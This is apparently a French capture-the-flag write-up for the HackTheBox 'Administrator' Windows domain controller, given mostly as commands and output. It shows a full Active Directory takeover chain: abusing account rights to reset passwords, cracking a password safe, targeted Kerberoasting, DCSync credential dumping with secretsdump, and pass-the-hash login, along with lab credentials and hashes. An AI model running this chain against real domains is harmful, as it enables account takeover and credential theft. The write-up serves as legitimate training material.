---
title: HTB | Administrator
description: 
slug: administrator-htb
date: 2024-12-01 00:00:00+0000
#image: cover.png
categories:
    - HackTheBox
tags:
    - Windows
    - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Administrator cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Administrator</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.42</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users

```bash
Olivia : ichliebedich
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
ethan : limpbizkit
Administrator : 3dc553ce4b9fd20bd016e098d2d2fd2e
```

## Enumeration

### Threader 3000

```bash
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.11.42
------------------------------------------------------------
Scanning target 10.10.11.42
Time started: 2024-11-27 14:54:16.528194
------------------------------------------------------------
Port 21 is open
Port 53 is open
Port 139 is open
Port 135 is open
Port 88 is open
Port 464 is open
Port 445 is open
Port 389 is open
Port 593 is open
Port 636 is open
Port 3268 is open
Port 3269 is open
Port 5985 is open
Port 9389 is open
Port 47001 is open
Port 49665 is open
Port 49668 is open
Port 49664 is open
Port 49666 is open
Port 49670 is open
Port 53246 is open
Port 53276 is open
Port 53268 is open
Port 53251 is open
Port 53313 is open
Port 63231 is open
Port scan completed in 0:00:08.796993
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p21,53,139,135,88,464,445,389,593,636,3268,3269,5985,9389,47001,49665,49668,49664,49666,49670,53246,53276,53268,53251,53313,63231 -sV -sC -T4 -Pn -oA 10.10.11.42 10.10.11.42
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p21,53,139,135,88,464,445,389,593,636,3268,3269,5985,9389,47001,49665,49668,49664,49666,49670,53246,53276,53268,53251,53313,63231 -sV -sC -T4 -Pn -oA 10.10.11.42 10.10.11.42
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-27 14:55 CET

Nmap scan report for 10.10.11.42
Host is up (0.038s latency).

PORT      STATE  SERVICE          VERSION
21/tcp    closed ftp
53/tcp    closed domain
88/tcp    open   kerberos-sec     Microsoft Windows Kerberos (server time: 2024-11-27 20:55:50Z)
135/tcp   open   msrpc            Microsoft Windows RPC
139/tcp   open   netbios-ssn      Microsoft Windows netbios-ssn
389/tcp   closed ldap
445/tcp   closed microsoft-ds
464/tcp   open   kpasswd5?
593/tcp   closed http-rpc-epmap
636/tcp   closed ldapssl
3268/tcp  closed globalcatLDAP
3269/tcp  closed globalcatLDAPssl
5985/tcp  closed wsman
9389/tcp  closed adws
47001/tcp closed winrm
49664/tcp open   msrpc            Microsoft Windows RPC
49665/tcp open   msrpc            Microsoft Windows RPC
49666/tcp open   msrpc            Microsoft Windows RPC
49668/tcp closed unknown
49670/tcp closed unknown
53246/tcp closed unknown
53251/tcp closed unknown
53268/tcp closed unknown
53276/tcp closed unknown
53313/tcp closed unknown
63231/tcp closed unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.94 seconds
------------------------------------------------------------
Combined scan completed in 0:02:32.888755
```

### nmap

```bash
nmap 10.10.11.42 -sV -sC -T4 -Pn       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 18:52 EST
Nmap scan report for administrator.htb (10.10.11.42)
Host is up (0.072s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-01 06:52:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-01T06:52:40
|_  start_date: N/A
|_clock-skew: 7h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds
```

### rpcclient enumusers

```bash
rpcclient -U Olivia%ichliebedich 10.10.11.42 -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[olivia] rid:[0x454]
user:[michael] rid:[0x455]
user:[benjamin] rid:[0x456]
user:[emily] rid:[0x458]
user:[ethan] rid:[0x459]
user:[alexander] rid:[0xe11]
user:[emma] rid:[0xe12]
```

### smbclient

```bash
smbclient -L //10.10.11.42 -U Olivia%ichliebedich

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.42 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### SharpHound

```bash
upload SharpHound.ps1 .
```

### Bloodhound
On importe les données obtenu. Puis on voit que Olivia a des acces generic All sur Michael. On peut alors changer son mot de passe:
```bash
## Olivia : Droits GenericAll sur l'utilisateur Michael
        Set-ADAccountPassword -Identity "Michael" -NewPassword (ConvertTo-SecureString -AsPlainText "azertyazerty" -Force) -Reset

## Connexion avec le compte de Michael
evil-winrm -i 10.10.11.42 -u Michael -p azertyazerty

## Michael : Droits ForceChangePassword

## D'abord, il faut ajouter PowerView.ps1 pour obtenir certaines commandes dans
## le powershell de Evil-Winrm
upload PowerView.ps1

## On load powerview dans le powershell
## On met un "." devant pour charger dans l'environnement powershell actuelle et pas dans un sous-environnement
. .\PowerView.ps1

## Changement du mot de passe de Benjamin
Set-DomainUserPassword -Identity Benjamin -AccountPassword (ConvertTo-SecureString 'azertyazerty' -AsPlainText -Force) -Verbose

## Connexion avec l'utilisateur Benjamin
evil-winrm -i 10.10.11.42 -u Benjamin -p azertyazerty

## RIEN !
smbclient

## FTP
ftp 10.10.11.42
> get Backup.psafe3
```
## Foothold

### Bruteforce Backup.psafe3
On bruteforce le password maitre du fichier Backup.psafe3 qui est un fichier password safe. Pour cela, on utilise `hashcat`:
```bash
$ hashcat -m 5200 -a 0 Backup.psafe3 ~/wordlists/rockyou.txt

hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 6839/13742 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /home/leopold/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139922195
* Keyspace..: 14344385

Backup.psafe3:tekieromucho                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Thu Nov 28 15:13:47 2024 (0 secs)
Time.Estimated...: Thu Nov 28 15:13:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/leopold/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    27754 H/s (5.85ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5120/14344385 (0.04%)
Rejected.........: 0/5120 (0.00%)
Restore.Point....: 4608/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: Liverpool -> babygrl
Hardware.Mon.#1..: Temp: 60c Util: 22%

Started: Thu Nov 28 15:13:27 2024
Stopped: Thu Nov 28 15:13:48 2024
```

### PasswordSafe
On installe `pwsafe` puis on ouvre la base de donnée avec le mot de passe trouvé **tekieromucho**.
```bash
sudo apt isntall pwsafe
pwsafe ./Backup.psafe3

alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur

evil-winrm -i 10.10.11.42 -u alexander -p UrkIbagoxMyUGw0aPlj9B0AXSea4Sw

evil-winrm -i 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb

./nxc smb 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
SMB         10.10.11.42     445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 

evil-winrm -i 10.10.11.42 -u emma -p WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

### User flag
Finalement, on obtient le flag utilisateur grâce à Emily
```bash
evil-winrm -i 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
3415.....de32
```

## Privilege Escalation

### Emily -> Ethan

On doit faire un kerberosting. D'après le write-up, il y avait une manière plus simple de le faire grace a ce repo github qui fait toutes les etapes qu'on a effectué à la main d'un coup:
> git clone https://github.com/ShutdownRepo/targetedKerberoast

```bash
## Depuis Emily evilWinrm
. .\PowerView.ps1

Set-DomainObject -Identity Ethan -Set @{serviceprincipalname='fakeService/targetHost'}

## Depuis Kali
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo ntpdate administrator.htb                                               
2024-11-29 16:04:44.623613 (-0500) +25200.766571 +/- 0.493670 administrator.htb 10.10.11.42 s1 no-leap
CLOCK: time stepped by 25200.766571
                       
┌──(kali㉿kali)-[~/Downloads]
└─$ GetUserSPNs.py administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request

hashcat -m 13100 -a 0 ethan_hash.txt ~/wordlists/rockyou.txt --optimized-kernel-enable --show  leopold@leopold-ZenBook-UX434FAC-UX434FA
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$78ac2707afa86369c7b7ac6481d4f104$90702b9d78c06a35af5186690e4534b9432409b6e97765e513071ac185c0547c06cb3a2bf9b7268791819e21671adc50267d2233c02f05a3528d9a3341a87a2f470a8b7cf56a3d326751f9def7e0ba074bc3898d2159339e52406c576ce48895c687ad7460ed922d25a7f311197ab8ba2dd2f407690371cea35ab9509f4323aef68705ff3a735d7a461691040e3f6cee60cf8872450c1915429bc741357983166310c5664995fbb6d2e94d555c8ecd59e01f951860d21da3adda55559976f5472be684af958d97e449d1359f5c21e24cd684a1b4db78ff6386b7b02dcecc7bec3bd3b073ac659d50f2e168563a99ff4e8a75460d653acc88eda530e4de755074de68faa776a437a45ce3a681e63edd36130040528f02bf655f8b2ef8fdac61d33c10c10573f4641551d55a950bc13ca30d4dbe622be89f6296f0d330352910d3df0d4c659408a422dbba104e64d3e061a9a182167250a3943ad22a24aceb2e7c51a2e76fc14125c88fb0990601a8f28b2ee96da6da4cf743800c7777e0549fa84d96504a8e250deeb266786714f9d3aa19fcb0f60cf60b788f6def223a11dfda0e0bbbbff61293d7c30925f7f743494f9950fd6684d6f60ab77494e726a75178cf7112b961665ea10213fbb40702faa66dcecd6c7be70738ee8d6e25bafc67962d7aa43cb4a36eb367ecffe26060cc38f411d26e41a3a37ea0d62e3be77d42daee37a277ac464d8b1e2b3d2b5587d2ef0bac76a15009361f4d5256be13b408617cf910a9faa14d1f7997fe85c51ee20f0977fd60381b815f0acff3cb3d4b6a1a6ff72f0d75d03190ed77c663cdd6cc2c11f87916456861d928554bc0cea4f2b05ea58afff209e19964ad6a5e69c2775a17645f61e39c24dd3b9705272580e72db2438ee10e26ce49cedcc6d40727d8d9eb839db1029fbe39d197208829689909afca82def5d5143bf5e80d7486bace7c1ce7364615030fe65555f03f8fc90791c3d3760feaa03e7e6c9b4654e80ccb1bc5803bb3735e17b3e025fccd1e510aff673cd9d17bb03d1ffd1a7ffaf60b730a619263ed6b67af39efff762026ef683e8b0d330c1f1da452383fab9acb9c652257b3400e2190f4603361cf61f7d187d15a71702bbc95eec7838de2ae64584e64d8ee59de45de529a913f473a52a312dd66b3645b1b0d001147ad744436b8cfdb72af6dc5defe880a6170c24ee592d53f3b8874678c202be3fdcc5b412b59b5800fcd25641bbb8e443f1b94f25c206a628ef448eb0d205b0cf7ec9c90374d53f20fff82be21a8002a6de850eeb67e16e0e6e0022ecaa54ef7ef46c0b0bf38d819c28863e1611d6112b08683ae1ac7c3cee339587b502e83369f27b7b445964fa6efb504fec49f0c5a319aa341273a50902ee8531e27b289afa18c617eaa5d806303d723045102267a39773e6da6e1e4949cf3fdcea35174107c6205feb621037c4dcb074a3b3684434ca2da040e93e981ad3f12e7bb106a9bc2824f5ac151556eaea4a97a972deb5da307d67938fe59:limpbizkit
```
On obtient les creds de Ethan:`limpbizkit`

```bash
rpcclient -U "administrator.htb\ethan%limpbizkit" 10.10.11.42

ldapsearch -x -H ldap://10.10.11.42 -D "ethan@administrator.htb" -w "limpbizkit" -b "DC=administrator,DC=htb"

## Tentatives d'ouvertur d'un shell
$ evil-winrm -i 10.10.11.42 -u ethan -p limpbizkit
$ wmiexec.py 'administrator.htb/ethan:limpbizkit@10.10.11.42'
$ psexec.py 'administrator.htb/ethan:limpbizkit@10.10.11.42'                              
$ dcomexec.py 'administrator.htb/ethan:limpbizkit@10.10.11.42'
```

### Secretsdump
On récupère le hash de l'administrateur grâce au script secretsdump et aux droits de l'utilisateur ethan.
```bash
secretsdump.py -just-dc ethan:limpbizkit@10.10.11.42 -outputfile dcsync_hashes                   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:de3afc157b17c25bf056296233cf23629c06aa2f19d414afbe0afe3da7d59835
administrator.htb\michael:aes128-cts-hmac-sha1-96:038498213933ca1f3d43b4d7f6b0a572
administrator.htb\michael:des-cbc-md5:07bf8f89c229c219
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:c0e6eaa8e841c72e55ef6a938565403e27aa728f5397e75d8cae6cd3423957bd
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:3e8b0ff2f07fd2178ec4d33f1ad0bc4b
administrator.htb\benjamin:des-cbc-md5:4a4aa4e3bc5eab61
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 

```

### Evil-winrm
En utilisant le hash de l'administrator on peut directement se connecter avec `evil-winrm`:
```bash
$ evil-winrm -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e -i 10.10.11.42
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/29/2024  10:54 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
8431.....8a6b
```

### Pass The Ticket Attack (PTT)
PAS REUSSI, FINALEMENT PAS UTILE ?
```bash
export KRB5CCNAME=Administrator.ccache
## On récupère un ticket
getTGT.py ADMINISTRATOR.HTB/Administrator -aesKey 9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```